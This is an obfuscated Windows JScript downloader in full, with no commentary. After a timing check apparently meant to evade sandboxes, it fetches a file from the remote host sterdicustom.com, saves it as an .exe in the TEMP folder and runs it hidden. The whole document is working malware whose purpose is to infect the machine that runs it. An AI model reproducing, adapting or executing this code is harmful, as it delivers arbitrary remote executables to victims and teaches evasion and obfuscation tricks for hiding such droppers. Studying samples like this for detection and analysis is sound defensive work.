var _H0 = false;
var _H = "CreateObject";
var _VP = function _HN() {return WScript[_H]("WScript"+".Shell");}(), _PY = 11;
var _TT = "MSXML2.XMLHTTP";
var _A = 2123213;
var _HC = 0;
function _XD(_HQ){_VP["Run"](_HQ, _HC, _HC);};
function _KK(){return _TT + "";};
function _PG(_C0, _OP){_HC = _HC * 1; return _C0 - _OP;};
function _YL(){return _H;};
/*@cc_on
  @if (@_win32 || @_win64)
    _H0 = true;
  @end
@*/
if (_H0)
{
var _I = "";
function _MZ(){return 22;};
var _CX = 0; var _QS = 0;
function _GM()
{
var _I0 = new this["Date"]();
var _JX = _I0["getUTCMilliseconds"]();
WScript["Sleep"](_MZ());
var _I0 = new this["Date"]();
var _D = _I0["getUTCMilliseconds"]();
WScript["Sleep"](_MZ());
var _I0 = new this["Date"]();
var _RF = _I0["getUTCMilliseconds"]();
var _CX = "_FQ";
_CX = _PG(_D, _JX);
var _QS = "_RQ";
_QS = _PG(_RF, _D);
_I = "open";
return _PG(_CX, _QS);
}
var _W0 = false;
var _Y = false;
for (var _T = _HC; _T < _MZ() * 1; _T++){if (_GM() != _HC){
_W0 = true; 
_QS = "31" + 11 * _CX + _QS; 
_Y = true; 
break;
}}
function _W() {return ((_W0 == true) && (_W0 == _Y)) ? 1 : _HC;};
if (_W0 && _W() && _Y){
function _K() {return _VP["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "8lHpVVoTfGJ5BqW.ex" + "e";};
 _C = _KK();
 _FA = WScript[_H](_C);
 var _L = 1;
 while (_L){
try {
	if (_L == 1)
	{
		_FA[_I]("GET", "http://sterdicustom.com/w3iks", false);
		_FA["send"]();
		_KL = "Sleep";
	}
	WScript[_KL](_MZ() + 120); 
	if (_FA["readystate"] < 2 * 2) continue;
	_L = _HC;
	function _OC(_F) {var _Z = (1, 2, 3, 4, 5, _F); return _Z;};
	_I2 = WScript[_YL()]("ADODB.Stream");
	_C = _I2;
	_C[_I]();
	_C["type"] = _OC(1);
	_C["write"](_FA["ResponseBody"]);
	_I2["position"] = _OC(_HC);
	_C["Save" + "ToFile"](_K(), 2);
	_I2["cl"+"ose"]();
	_CR = _K();
	_XD(_CR);
} catch(_I1){};
}
}
}

